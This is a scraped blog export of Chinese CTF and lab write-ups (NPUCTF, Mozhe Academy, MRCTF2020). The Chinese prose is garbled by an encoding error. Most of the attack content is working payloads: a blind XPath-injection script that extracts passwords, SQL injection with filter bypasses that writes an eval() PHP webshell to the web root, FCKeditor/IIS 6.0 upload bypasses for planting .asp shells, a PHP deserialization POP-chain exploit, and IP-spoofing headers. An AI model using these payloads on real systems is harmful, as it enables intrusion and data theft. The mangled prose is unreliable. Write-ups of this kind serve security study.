password/text()=&#x27;&#x27;]&quot;; èŠ‚ç‚¹éå†æ„é€ ç±»ä¼¼ä¸‹é¢ï¼Œæ³¨æ„Xpathæ³¨å…¥ä¸åƒsqlæ³¨å…¥ä¸€æ ·æœ‰æ³¨é‡Š 1234u=admin&#x27;] | //* | //*[&#x27;&amp;p=// æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢$query = &quot;/root/users/user[username/text()=&#x27;&#x27;] | //* | //*[&#x27;&#x27; and password/text()=&#x27;&#x27;]&quot;;// &#x27;]é—­åˆå‰è¾¹çš„ ä¸­é—´ç”¨|è¿æ¥ //*ä»£è¡¨é€‰å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰å…ƒç´  è¿™é‡Œçš„|ä¸èƒ½ç”¨orä»£æ›¿ å¸ƒå°”ç›²æ³¨ä¸Šé¢çš„æ–¹æ³•æ— æ³•çˆ†å‡ºæ¥flagï¼Œå› ä¸ºphpä¹‹é€‰æ‹©äº†idå’Œpasswordä¸¤ä¸ªèŠ‚ç‚¹ æˆ‘ä»¬å¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨çš„æ–¹æ³•çˆ†å‡ºæ¥flag åˆ¤æ–­èŠ‚ç‚¹æ•°é‡ï¼š 123?u=&#x27; or count(/)=1 or &#x27;1&amp;p=// æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢,æ­£å¸¸è¿”å›è¯´æ˜èŠ‚ç‚¹æ•°é‡æ­£ç¡®$query = &quot;/root/users/user[username/text()=&#x27;&#x27; or count(/)=1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;; å¯ä»¥ä¾æ¬¡éå†ç¬¬äºŒå±‚ã€‚ã€‚ã€‚ 1?u=&#x27; or count(/*/*)=1 or &#x27;1&amp;p= è·å–èŠ‚ç‚¹åç§°ï¼š 1234// åˆ¤æ–­èŠ‚ç‚¹é•¿åº¦?u=&#x27; or string-length(name(/*[1]))=1 or &#x27;1&amp;p=// æˆªå–èŠ‚ç‚¹åç§°æ¯”è¾ƒå­—ç¬¦?u=&#x27; or substring(name(/*[1]), 1, 1)=&#x27;a&#x27; or &#x27;1&amp;p= æŒ‰ç…§è¿™ç§æ€è·¯æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰èŠ‚ç‚¹è·‘å‡ºæ¥ å¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ€è·¯ï¼Œå…ˆè¯•ä¸‹ä¸‡èƒ½å¯†ç  æç¤ºéæ³•æ“ä½œè¯´æ˜æˆåŠŸå¸¦å…¥äº†ï¼Œexp: 12345678910111213141516171819202122232425262728293031323334353637import requestsimport reimport randomurl=&#x27;http://9c306d79-3e0b-4b84-8711-dcfe1d3dc1b4.node3.buuoj.cn/login.php&#x27;s=&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;-*#$@()+^?/&lt;&gt;|~&#125;&#x27;data=&quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;# def get_token():# ran=random.randint(1,100000000000000)# headers=&#123;# &quot;Cookie&quot;:&quot;PHPSESSID=&#123;&#125;&quot;.format(str(ran))# &#125;# r1=requests.get(url,headers=headers,proxies=proxies)# token=re.search(r&#x27;\\&lt;input type=\\&quot;hidden\\&quot; id=\\&quot;token\\&quot; value=\\&quot;(.*)\\&quot; \\/\\&gt;&#x27;,r1.text).group(1)# return ran,tokenflag=&#x27;&#x27;for i in range(1,50): flag1=flag for j in s: sess=requests.session() # ran,token=get_token() r1=sess.get(url,proxies=proxies) token=re.search(r&#x27;\\&lt;input type=\\&quot;hidden\\&quot; id=\\&quot;token\\&quot; value=\\&quot;(.*)\\&quot; \\/\\&gt;&#x27;,r1.text).group(1) headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/xml&#x27; &#125; r2=sess.post(url,data=data.format(str(i),j,token),headers=headers,proxies=proxies) if &#x27;éæ³•æ“ä½œ&#x27; in r2.text: flag+=j print(j) if flag1==flag: breakprint(flag) è·‘å‡ºå¦‚ä¸‹æ ¼å¼çš„èŠ‚ç‚¹ 1234567891011121314&lt;root&gt; &lt;accounts&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;&lt;/username&gt; &lt;password&gt;&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;&lt;/username&gt; &lt;password&gt;&lt;/password&gt; &lt;/user&gt; &lt;/accounts&gt;&lt;/root&gt; ç„¶åæˆ‘ä»¬ç”¨ 1&lt;username&gt;&#x27; or substring(/root/accounts/user/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt; è·‘å‡ºç¬¬ä¸€ä¸ªï¼Œå‘ç°ç™»é™†ä¸Šå»å•¥éƒ½æ²¡æœ‰ 12username=guestpassword=e10adc3949ba59abbe56e057f20f883e MD5è§£å¯†123456 å†è·‘ç¬¬äºŒä¸ª 12username=adm1npassword=cf7414b5bdb2e65ee43083f4ddbc4d9f MD5è§£å¯†gtfly123 æ¥ç€å°±æ˜¯php://filterè¯»æ–‡ä»¶,è¿‡æ»¤äº†php,read,base,å¤§å†™ç»•è¿‡ 1admin.php?file=PHP://filter/rEad=convert.basE64-encode/resource=/flag å­¦é•¿å‡ºçš„é¢˜å¤ªé¡¶äº†ï¼Œè†œæ‹œï¼ï¼ï¼ misccryptoè¿™æ˜¯ä»€ä¹ˆå¯†ç é¢˜ç›®ï¼š æœäº†æœï¼Œæœåˆ°äº†ä¸ªæ—¥å†å¯†ç  Fä»£è¡¨å‘¨äº” S1ä»£è¡¨å‘¨å…­ S2ä»£è¡¨å‘¨æ—¥ åé¢æ˜¯ç¬¬å‡ ä¸ªå‘¨* å¯¹åº”å­—æ¯è¡¨å°±è¡Œ 1234F1 W1 S22 S21 T12 S11 W1 S133 1 12 5 14 4 1 18calendarflag&#123;calendar&#125; Classical_Cipher123å‹ç¼©åŒ…å¯†ç ï¼šgsv_pvb_rh_zgyzhså¯¹åº”æ˜æ–‡ï¼š ***_key_**_****** å†™äº†ä¸ªexp: 123456789for i,j in zip(&quot;pvb&quot;,&quot;key&quot;): print(ord(i)+ord(j))key=&#x27;&#x27;for i in &quot;gsv_pvb_rh_zgyzhs&quot;: if i!=&quot;_&quot;: key=key+chr(219-ord(i)) else: key=key+&quot;_&quot;print(key) å…¶å®è¿™ä¸ªæ˜¯åŸƒç‰¹å·´ä»€å¯†ç  è§£å‹ä¹‹åï¼Œä¸€å¼ å›¾ï¼Œåšå¤šäº†å°±çŸ¥é“æ˜¯çŒªåœˆå˜ç§å¯†ç å’ŒåŸƒåŠè±¡å½¢æ–‡å­—ï¼Œè´´ä¸€ä¸‹å›¾ï¼š åŸƒåŠè±¡å½¢æ–‡å­—ï¼š çŒªåœˆå¯†ç ï¼š æ‰€ä»¥è§£å‡ºæ¥å°±æ˜¯ï¼š 1flag&#123;classicalcode&#125; Mersenne_twister","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"NPUCTF","slug":"NPUCTF","permalink":"http://www.m00nback.xyz/tags/NPUCTF/"}]},{"title":"å¢¨è€…å­¦é™¢é¢˜ç›®writeup","slug":"å¢¨è€…å­¦é™¢é¢˜ç›®writeup","date":"2020-04-13T13:09:01.000Z","updated":"2020-04-26T10:23:41.946Z","comments":true,"path":"2020/04/13/å¢¨è€…å­¦é™¢é¢˜ç›®writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/","excerpt":"æœ€è¿‘360ä¼—æµ‹å¾ˆç«ï¼Œå¬è¯´å¥½å¤šè¿™ä¸Šé¢çš„é¢˜ï¼ŒæŠ½ç©ºåšåšï¼","text":"æœ€è¿‘360ä¼—æµ‹å¾ˆç«ï¼Œå¬è¯´å¥½å¤šè¿™ä¸Šé¢çš„é¢˜ï¼ŒæŠ½ç©ºåšåšï¼ Webå®‰å…¨CMSæ¼æ´BeesCMSç³»ç»Ÿæ¼æ´åˆ†ææº¯æºå¾¡å‰‘æ‰«ç›®å½•ï¼š å‘ç°åå°/admin/login.phpï¼Œæ­¤å¤„å­˜åœ¨sqlæ³¨å…¥ è¯¦ç»†åˆ†æå‚è§ï¼šhttps://www.cnblogs.com/yuzly/p/11423384.html æ­¤å¤„éªŒè¯ç å­˜åœ¨æ¼æ´ï¼Œå³ä¸€ä¸ªéªŒè¯ç å¯å¤šæ¬¡ä½¿ç”¨ï¼Œæˆ‘ä»¬åœ¨usernameå¤„åŠ ä¸Šä¸€ä¸ª&#39;å‘ç° sqlè¯­å¥ä¹Ÿå‡ºæ¥äº† 1select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name=&#x27;dsad&#x27;&#x27; limit 0,1 æ¼æ´åˆ†æå¯çŸ¥ï¼Œunion, and,selectè¢«æ›¿æ¢ï¼Œå¯ä»¥è¿™æ ·ç»•è¿‡ï¼š 123union =&gt; uni union onselect =&gt; selselectectand =&gt; a and nd userè¾“å…¥,å‘ç°æˆåŠŸæŠ¥é”™æ³¨å…¥ 1admin &#x27; a and nd extractvalue(1,concat(1,database()))%23 è¯•ç€å†™shellï¼Œè¿™é‡Œæœ‰htmlspecialcharså‡½æ•°çš„è¿‡æ»¤ï¼Œ16è¿›åˆ¶æˆ–è€…charå‡½æ•°ç»•è¿‡ï¼Œurlç¼–ç å¥½åƒç»•è¿‡ä¸äº†ï¼Œè¿˜æœ‰å¯¹into ,outfileçš„è¿‡æ»¤ï¼Œå¯ä»¥è¿™æ ·ç»•è¿‡ 12outfile =&gt; outoutfilefileinto =&gt; in into æœ€ç»ˆæ„é€ payload: 1admin&#x27; uni union on selselectect 1,2,3,4,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e in into outoutfilefile %27/var/www/html/moonback.php%27%23 æˆ–è€… 1admin&#x27; uni union on selselectect null,null,null,null,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 49, 93, 41, 59, 63, 62) in into outoutfilefile %27/var/www/html/mb.php%27%23 å¯†ç ä¸º1ï¼Œèšå‰‘è¿åœ¨/key.txtå‘ç°key ç¼–è¾‘å™¨æ¼æ´ç¼–è¾‘å™¨æ¼æ´åˆ†ææº¯æº(ç¬¬1é¢˜)å‚è€ƒ:https://www.secpulse.com/archives/116338.html è®¿é—®é¶åœºï¼Œæç¤ºç¼–è¾‘å™¨åœ¨/fckeditor/ç›®å½• æŸ¥çœ‹ä¸€ä¸‹ç¼–è¾‘å™¨ç‰ˆæœ¬ä¿¡æ¯ 12/fckeditor/editor/dialog/fck_about.html/FCKeditor/_whatsnew.html æµ‹è¯•ä¸Šä¼ ç‚¹ 123456789101112131415161718192021222324252627FCKeditor/editor/filemanager/browser/default/connectors/test.htmlFCKeditor/editor/filemanager/upload/test.htmlFCKeditor/editor/filemanager/connectors/test.htmlFCKeditor/editor/filemanager/connectors/uploadtest.htmlFCKeditor/_samples/default.htmlFCKeditor/_samples/asp/sample01.aspFCKeditor/_samples/asp/sample02.aspFCKeditor/_samples/asp/sample03.aspFCKeditor/_samples/asp/sample04.aspFCKeditor/_samples/default.htmlFCKeditor/editor/fckeditor.htmFCKeditor/editor/fckdialog.htmlFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.phpFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspxFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jspFCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jspfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspxfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/php/connector.php éšä¾¿è¾“ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„å‘ç°æ˜¯IISçš„æŠ¥é”™é¡µé¢ï¼Œåœ¨ 1fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html å‘ç°å¯ä»¥ä¸Šä¼  åœ¨http å“åº”å¤´é‡Œçœ‹åˆ°æœ‰Microsoft-IIS/6.0ï¼Œç»•è¿‡æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œä¸éœ€è¦ç»•è¿‡å¥½åƒ 1. äºŒæ¬¡ä¸Šä¼ ç»•è¿‡ æ–‡ä»¶åâ€˜ . â€™ ä¿®æ”¹ä¸ºâ€˜ _ â€™ FCKåœ¨ä¸Šä¼ äº†è¯¸å¦‚shell.asp;.jpgçš„æ–‡ä»¶åï¼Œä¼šè‡ªåŠ¨å°†æ–‡ä»¶åæ”¹ä¸ºshell_asp;.jpgã€‚å¯ä»¥ç»§ç»­ä¸Šä¼ åŒåæ–‡ä»¶ï¼Œæ–‡ä»¶åä¼šå˜ä¸ºshell.asp;(1).jpg 2. æäº¤shell.php+ç©ºæ ¼ç»•è¿‡ æäº¤shell.php+ç©ºæ ¼ç»•è¿‡ ç©ºæ ¼åªæ”¯æŒwindowsç³»ç»Ÿï¼Œlinuxç³»ç»Ÿæ˜¯ä¸æ”¯æŒçš„ï¼Œå¯æäº¤shell.php+ç©ºæ ¼æ¥ç»•è¿‡æ–‡ä»¶åé™åˆ¶ã€‚ 3. iis6.0çªç ´æ–‡ä»¶å¤¹é™åˆ¶ 12345Fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z.aspFCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z&amp;uuid&#x3D;1244789975684FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;CurrentFolder&#x3D;&#x2F;&amp;Type&#x3D;Image&amp;NewFolderName&#x3D;shell.asp 4. æ–‡ä»¶è§£æé™åˆ¶ é€šè¿‡Fckeditorç¼–è¾‘å™¨åœ¨æ–‡ä»¶ä¸Šä¼ é¡µé¢ä¸­ï¼Œåˆ›å»ºè¯¸å¦‚1.aspæ–‡ä»¶å¤¹ï¼Œç„¶åå†åˆ°è¯¥æ–‡ä»¶å¤¹ä¸‹ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡çš„webshellæ–‡ä»¶ï¼Œè·å–å…¶shellã€‚ 1http:&#x2F;&#x2F;www.moonback.xyz&#x2F;images&#x2F;upload&#x2F;201806&#x2F;image&#x2F;1.asp&#x2F;1.jpg å…³äºè§£ææ¼æ´å‚è€ƒï¼šhttps://www.secpulse.com/archives/3750.html æœ€ç»ˆä¸Šä¼ ç±»ä¼¼shell.asp;jpgå°±èƒ½ä¸Šä¼ æˆåŠŸï¼ŒæˆåŠŸä¹‹åä¼šæŠŠç›®å½•æ–‡ä»¶åˆ—ä¸¾å‡ºæ¥,åœ°å€ï¼š 1&#x2F;userfiles&#x2F;file&#x2F;shell.asp;jpg èšå‰‘è¿æ‰¾flagå°±è¡Œ å¦‚æœæ‰¾ä¸åˆ°ç›®å½•çš„è¯å¯ä»¥è¯•è¯• 1. æ ¹æ®xmlè¿”å›ä¿¡æ¯æŸ¥çœ‹ç½‘ç«™ç›®å½• 1http:&#x2F;&#x2F;www.-sec.org&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;..&#x2F;..&#x2F;..&#x2F;&amp;NewFolderName&#x3D;shell.asp 2. è·å–å½“å‰æ–‡ä»¶å¤¹ 123FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F; 3. æ¸¸è§ˆcç›˜ 1&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;Curre 11","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"å¢¨è€…å­¦é™¢","slug":"å¢¨è€…å­¦é™¢","permalink":"http://www.m00nback.xyz/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"}]},{"title":"MRCTF2020 writeup","slug":"MRCTF2020-writeup","date":"2020-04-11T03:41:09.000Z","updated":"2020-04-26T12:21:25.641Z","comments":true,"path":"2020/04/11/MRCTF2020-writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/04/11/MRCTF2020-writeup/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†MRCTF 2020éƒ¨åˆ†é¢˜ç›®çš„writeup!","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†MRCTF 2020éƒ¨åˆ†é¢˜ç›®çš„writeup! webEz_bypassæŸ¥çœ‹æºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125; PYWebsite ä½ ä¼ ä½ ğŸå‘¢è¯•äº†å¥½å¤šï¼Œå‘ç°åªèƒ½ä¼ pngæ ¼å¼çš„æ–‡ä»¶,.htaccessç»•è¿‡ å†ä¸Šä¼ ä¸€ä¸ªpngçš„å›¾ç‰‡é©¬å³å¯ Ezpop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; exp: 1234567891011121314151617181920&lt;?phpclass Show&#123; public $source; public $str; public function __construct()&#123; $this-&gt;str=new Test(); $this-&gt;str-&gt;p=new Modifier(); &#125;&#125;class Test&#123; public $p;&#125;class Modifier &#123; protected $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;$a=new Show();$a-&gt;source=new Show();echo urlencode(serialize($a)); popé“¾ï¼š 1Show-&gt;__wakeup()-&gt;preg_match()-&gt;__toString()-&gt;Test-&gt;__get-&gt;Modifier-&gt;__invoke-&gt;append() åˆ†æä¸€ä¸‹ï¼Œååºåˆ—åŒ–é¦–å…ˆä¼šæ‰§è¡Œ__wakeup()æ–¹æ³•ï¼Œç„¶åpreg_matchåŒ¹é…è§¦å‘__toStringæ–¹æ³•ï¼Œå³å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²åŒ¹é…æ—¶ï¼Œ$stræ˜¯ä¸€ä¸ªTestå¯¹è±¡ï¼Œè·å¾—sourceå±æ€§ä»è€Œè§¦å‘__get()æ–¹æ³•ï¼Œ$pè¢«èµ‹å€¼ä¸ºModifierå¯¹è±¡ï¼Œç±»å½“ä½œå‡½æ•°è°ƒç”¨è§¦å‘__invokeæ–¹æ³•ï¼Œæ¥ç€å°±æ˜¯æ–‡ä»¶åŒ…å«php://fiter base64è¯»æ–‡ä»¶äº† å¥—å¨ƒæŸ¥çœ‹æºä»£ç  123456789&lt;?php$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼Œpreg_matchæ¢è¡Œç»•è¿‡ï¼Œpayload: 1?b u p t=23333%0a æç¤ºsecrettw.phpæŸ¥çœ‹æºä»£ç ï¼Œæ˜æ˜¾æ˜¯jsfuck æ§åˆ¶å°æ‰§è¡Œï¼Œæç¤º POSTè¿‡å»ä¸€ä¸ªå‚æ•°ä¸ºMerakï¼Œå¾—åˆ° 12345678910111213141516171819202122232425&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; æŠŠchangeå‡½æ•°é€†å‘ä¸€ä¸‹ï¼š 1234567891011&lt;?phpfunction change($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; $s = base64_encode($re); echo $s;&#125;change(&#x27;flag.php&#x27;);// ZmpdYSZmXGI= ä¼ªé€ ä¸€ä¸‹ip: 123456789X-Forwarded-For:127.0.0.1X-Forwarded-Host:127.0.0.1X-Client-IP:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1 2333é‚£é‡Œç”¨data://åè®® æœ€ç»ˆè¯·æ±‚ Ezauditdirsearchæ‰«ä¸çŸ¥ä¸ºå•¥æ‰«ä¸å‡ºæ¥ï¼Œæ‰‹æ€¼/www.zipï¼Œindex.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header(&#x27;Content-type:text/html; charset=utf-8&#x27;);error_reporting(0);if(isset($_POST[&#x27;login&#x27;]))&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $Private_key = $_POST[&#x27;Private_key&#x27;]; if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123; // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢ header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;; exit;&#125; else if($Private_key != &#x27;*************&#x27; ) &#123; header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;; exit; &#125; else&#123; if($Private_key === &#x27;************&#x27;)&#123; $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$mt_srand() = KVQP0LdJKRaV3n9D how to get crispr&#x27;s private_key??? å…ˆçœ‹æœ€ä¸‹é¢ï¼Œå¾ˆæ˜æ˜¾phpä¼ªéšæœºæ•°ï¼Œç»™äº†mt_srand()ï¼Œç”¨php_mt_seedçˆ†ç ´å‡ºç§å­ï¼Œå†ç”¨ç§å­ç®—private_key å…ˆç”Ÿæˆphp_mt_seedçˆ†ç ´çš„åºåˆ— 1234s=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;pwd=&quot;KVQP0LdJKRaV3n9D&quot;for i in pwd: print(str(s.index(i))+&quot; &quot;+str(s.index(i))+&quot; 0 61 